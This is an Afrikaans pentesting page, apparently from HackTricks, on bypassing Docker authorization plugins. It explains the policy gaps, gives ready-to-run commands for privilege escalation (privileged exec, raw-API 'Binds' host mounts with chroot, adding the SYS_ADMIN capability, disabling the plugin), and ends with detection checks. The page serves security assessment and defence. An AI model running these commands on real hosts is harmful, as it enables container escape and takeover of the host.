# Runtime-magtigingsinproppe

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Runtime-magtigingsinproppe is ’n ekstra beleidslaag wat bepaal of ’n aanroeper ’n gegewe daemon-aksie mag uitvoer. Docker is die klassieke voorbeeld. Enigiemand wat met die Docker-daemon kan kommunikeer, het by verstek in wese breë beheer daaroor. Magtigingsinproppe probeer dié model beperk deur die geverifieerde gebruiker en die aangevraagde API-bewerking te ondersoek en dan die versoek volgens beleid toe te laat of te weier.

Hierdie onderwerp verdien ’n eie bladsy omdat dit die uitbuitingsmodel verander wanneer ’n aanvaller reeds toegang tot ’n Docker API of tot ’n gebruiker in die `docker`-groep het. In sulke omgewings is die vraag nie meer net "kan ek die daemon bereik?" nie, maar ook "word die daemon deur ’n magtigingslaag begrens, en indien wel, kan daardie laag omseil word deur onbehandelde eindpunte, swak JSON-ontleding of toestemmings vir inpropbestuur?"

## Werking

Wanneer ’n versoek die Docker-daemon bereik, kan die magtigingstelsel die versoekkonteks aan een of meer geïnstalleerde inproppe deurgee. Die inprop sien die geverifieerde gebruiker se identiteit, die versoekbesonderhede, geselekteerde opskrifte en dele van die versoek- of antwoordliggaam wanneer die inhoudstipe geskik is. Verskeie inproppe kan geketting word, en toegang word slegs verleen as alle inproppe die versoek toelaat.

Hierdie model klink sterk, maar die veiligheid daarvan hang heeltemal af van hoe volledig die beleidsskrywer die API verstaan het. ’n Inprop wat `docker run --privileged` blokkeer maar `docker exec` ignoreer, alternatiewe JSON-sleutels soos topvlak-`Binds` miskyk of inpropadministrasie toelaat, kan ’n valse gevoel van beperking skep terwyl dit steeds direkte paaie na voorregte-eskalasie ooplaat.

## Algemene teikens vir inproppe

Belangrike areas om in beleid te hersien, sluit in:

- eindpunte vir die skep van houers
- `HostConfig`-velde soos `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` en opsies vir naamruimtedeling
- `docker exec`-gedrag
- eindpunte vir inpropbestuur
- enige eindpunt wat runtime-aksies indirek buite die bedoelde beleidsmodel kan aktiveer

Voorbeelde soos Twistlock se `authz`-inprop en eenvoudige opvoedkundige inproppe soos `authobot` het hierdie model histories maklik gemaak om te bestudeer, omdat hul beleidslêers en kodepaaie gewys het hoe die kartering van eindpunte na aksies werklik geïmplementeer is. Vir assesseringswerk is die belangrike les dat die beleidsskrywer die volle API-oppervlak moet verstaan, en nie net die mees sigbare CLI-opdragte nie.

## Misbruik

Die eerste doel is om vas te stel wat werklik geblokkeer word. As die daemon ’n aksie weier, lek die fout dikwels die inprop se naam, wat help om vas te stel watter beheer gebruik word:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

As jy breër endpoint-profilering benodig, is nutsmiddels soos `docker_auth_profiler` nuttig omdat hulle die andersins herhalende taak outomatiseer om na te gaan watter API-roetes en JSON-strukture werklik deur die plugin toegelaat word.

As die omgewing ’n pasgemaakte plugin gebruik en jy met die API kan kommunikeer, stel vas watter objekvelde werklik gefiltreer word:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Hierdie kontroles is belangrik omdat baie magtigingsfoute veldspesifiek eerder as konsep-spesifiek is. ’n Inprop kan ’n CLI-patroon verwerp sonder om die ekwivalente API-struktuur ten volle te blokkeer.

### Volledige voorbeeld: `docker exec` voeg bevoorregting by ná die skep van die container

’n Beleid wat die skep van bevoorregte containers blokkeer, maar die skep van onbeperkte containers plus `docker exec` toelaat, kan steeds omseil word:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

As die daemon die tweede stap aanvaar, het die gebruiker ’n bevoorregte interaktiewe proses binne ’n container herwin wat die beleidouteur geglo het beperk was.

’n Beperkte `sudo`-reël kan dieselfde roete blootlê, selfs wanneer die oproeper nie direk toegang tot die Docker-socket het nie. Byvoorbeeld, ’n root-bevoegde `/usr/bin/docker exec *`-toestemming kan die oproeper toelaat om Docker se `--privileged`- en `--user root`-opsies te verskaf. ’n Lopende container word steeds vereis; op sommige Linux-gashere is sy ID sigbaar in ’n `containerd-shim`-proses se opdragreël wanneer `docker ps` geweier word. Behandel die reël as ’n leidraad vir hersiening: bevestig die effektiewe sudo-beleid, die daemon se magtigingskontroles, user namespaces, en of die gevolglike proses toegang tot ’n gasheertoestel of skryfbare gasheermount kan kry. Docker dokumenteer die exec-opsies in sy [CLI-verwysing](https://docs.docker.com/reference/cli/docker/container/exec/).

’n Wrapper wat as root loop en ’n Compose-lêer aanvaar wat deur die oproeper gekies is, moet die volledige [Compose-diensmodel](https://docs.docker.com/reference/compose-file/services/) valideer, nie net `privileged: true` verwerp en `:ro` op bind mounts vereis nie. Hersien `cap_add`, `security_opt`, devices, namespaces, build-insette en elke ondersteunde volumesintaksis. ’n Leesalleen-bind mount kan steeds van binne ’n container skryfbaar word met geskikte capabilities en verslapte sekuriteitsbeperking, afhangend van daemon- en kernelbeleid. Gasheerpad-toelaatlyste wat net op voorvoegsels staatmaak en simboliese-skakelkontroles op die laaste padkomponent moet ook hersien word. ’n sudo-reël en ’n letterlike `docker-compose up`-aanroep identifiseer ’n kandidaat; die wrapper se effektiewe validering en die runtime-daemonbeperkings bepaal of dit uitbuitbaar is.

### Volledige voorbeeld: Bind Mount deur Raw API

Sommige gebrekkige beleide inspekteer net een JSON-vorm. As die root-filesystem-bind mount nie konsekwent geblokkeer word nie, kan die gasheer steeds gemount word:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

Dieselfde idee kan ook onder `HostConfig` voorkom:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

Die impak is ’n volledige ontsnapping uit die gasheer se lêerstelsel. Die interessante detail is dat die omseiling die gevolg is van onvolledige beleidsdekking, eerder as ’n kernel-fout.

### Volledige voorbeeld: Ongekontroleerde Capability-kenmerk

As die beleid vergeet om ’n capability-verwante kenmerk te filter, kan die aanvaller ’n container skep wat ’n gevaarlike capability terugkry:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Sodra `CAP_SYS_ADMIN` of ’n soortgelyke sterk capability teenwoordig is, word baie breakout-tegnieke wat in [capabilities.md](protections/capabilities.md) en [privileged-containers.md](privileged-containers.md) beskryf word, bereikbaar.

### Volledige voorbeeld: Deaktiveer die inprop

As plugin-bestuursbewerkings toegelaat word, kan die netjiesste bypass wees om die beheer heeltemal af te skakel:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Dit is ’n beleidsfaling op die beheerlaagvlak. Die magtigingslaag bestaan, maar die gebruiker wat dit moes beperk, behou steeds die toestemming om dit te deaktiveer.

## Kontroles

Hierdie opdragte is daarop gemik om vas te stel of ’n beleidslaag bestaan en of dit volledig of oppervlakkig lyk.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Wat is hier interessant:

- Weieringsboodskappe wat ’n pluginnaam insluit, bevestig ’n magtigingslaag en verklap dikwels die presiese implementering.
- ’n Pluginlys wat vir die aanvaller sigbaar is, kan genoeg wees om vas te stel of deaktiveer- of herkonfigureerbewerkings moontlik is.
- ’n Beleid wat slegs ooglopende CLI-aksies blokkeer, maar nie rou API-versoeke nie, moet as omseilbaar beskou word totdat die teendeel bewys is.

## Looptydverstekwaardes

| Looptyd / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Nie by verstek geaktiveer nie | Toegang tot die daemon is in effek alles-of-niks, tensy ’n magtigingsplugin opgestel is | onvolledige pluginbeleid, swartlyste in plaas van witlyste, toelating van pluginbestuur, blinde kolle op veldvlak |
| Podman | Nie ’n algemene direkte ekwivalent nie | Podman steun gewoonlik meer op Unix-permissies, wortellose uitvoering en besluite oor API-blootstelling as op Docker-styl authz-plugins | ’n wortel-voorregte Podman-API wyd blootstel, swak socket-permissies |
| containerd / CRI-O | Ander beheermodel | Hierdie looptye steun gewoonlik op socket-permissies, vertrouensgrense van nodusse en beheer op hoër vlak deur die orkestreerder, eerder as Docker-authz-plugins | die socket in werkladings koppel, swak aannames oor plaaslike vertroue op nodusse |
| Kubernetes | Gebruik authn/authz op die API-bediener- en kubelet-lae, nie Docker-authz-plugins nie | Cluster RBAC en toelatingskontroles is die hoofbeleidslaag | te ruim RBAC, swak toelatingsbeleid, kubelet- of looptyd-API’s direk blootstel |

{{#include ../../../banners/hacktricks-training.md}}
